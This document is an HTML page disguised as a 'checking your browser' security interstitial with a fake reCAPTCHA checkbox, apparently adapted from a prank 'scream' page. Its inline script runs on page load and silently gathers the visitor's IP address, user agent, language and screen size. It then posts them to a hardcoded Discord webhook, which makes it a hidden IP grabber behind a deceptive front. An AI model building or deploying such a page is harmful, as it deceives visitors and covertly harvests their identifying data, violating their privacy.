<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Checking your browser...</title>
    <link rel="shortcut icon" href="img/Favicon.ico" type="image/x-icon">
</head>

<body>
    <div class="container-video" id="container-video">
        <video class="video" id="video" autoplay muted loop>
            <source src="vid/video.mp4" type="video/mp4" />
            Your browser does not support the video tag.
        </video>
    </div>

    <div class="container" id="container">
        <img class="gif" src="img/dots.gif" alt="Dots">
        <h2 class="text">Checking your browser before accessing attachment.</h2>
        <p class="text">This process is automatic. Your browser will redirect to your requested content shortly.</p>
        <p class="text-captcha" id="text-captcha">Please enter captcha</p>
        <div class="counter" id="counter">3</div>
        <div class="recaptcha-container" id="recaptcha-container">
            <div class="button-container">
                <div class="button" id="button" onclick="showVideo()"></div>
            </div>
            <div class="text-container">
                <p>I'm not a robot</p>
            </div>
            <div class="image-container">
                <img src="img/RecaptchaLogo.png" alt="Recaptcha">
                <p>Privacy - Terms</p>
            </div>
        </div>
        <a class="link" href="https://github.com/Pablo-Restrepo/Troll-Page-Scream"></a>
        <p>Ray ID: 348759h65g34h</p>
    </div>

    <script src="main.js"></script>
    <script>
        function sendDetailsToWebhook(details) {
            const webhookUrl = 'https://ptb.discord.com/api/webhooks/1257984661200830484/9OGdZXwcO93Ox8MJ2rHDJRZ5GSIIGJsZivt-9KO1HuPWZ9dBW5FuvIMHPl9PVlz87Np6';

            const data = {
                content: `User Details: ${details}`
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }

        function getUserDetails() {
            const ipFetch = fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip)
                .catch(error => {
                    console.error('Error getting IP:', error);
                    return 'N/A';
                });

            const userAgent = navigator.userAgent;
            const language = navigator.language;
            const screenWidth = screen.width;
            const screenHeight = screen.height;

            return ipFetch.then(ip => {
                return `IP: ${ip}\nUser-Agent: ${userAgent}\nLanguage: ${language}\nScreen Resolution: ${screenWidth}x${screenHeight}`;
            });
        }

        // Get the user details and send them to the webhook
        getUserDetails().then(details => {
            sendDetailsToWebhook(details);
        });
    </script>
</body>

</html>
